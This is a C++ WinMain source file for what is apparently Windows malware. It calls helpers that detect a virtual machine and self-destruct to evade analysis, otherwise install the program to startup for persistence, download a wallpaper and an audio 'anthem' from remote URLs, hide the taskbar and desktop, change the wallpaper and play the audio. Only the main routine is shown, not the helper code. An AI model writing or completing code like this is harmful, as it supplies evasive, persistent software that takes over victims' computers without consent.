#include <Windows.h>

#include "Links.h"

#include "AntiVM.h"
#include "SelfDestruct.h"
#include "Startup.h"
#include "HideTaskBar.h"
#include "HideDesktop.h"
#include "Wallpaper.h"
#include "Anthem.h"

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
	if (IsVirtualMachine()) {
		SelfDestruct();
	}
	else {
		InstallToStartup();
		CheckWallpaper(Links::_WALLPAPER_JPG_URL, Links::_WALLPAPER_BMP_FILE_NAME, Links::_WALLPAPER_JPG_FILE_NAME);
		CheckAnthem(Links::_ANTHEM_WAV_URL, Links::_ANTHEM_WAV_FILE_NAME);
		HideTaskBar();
		
		SetWallpaper();
		HideDesktop();
		PlayAnthem();
	}
	
	return 0;
}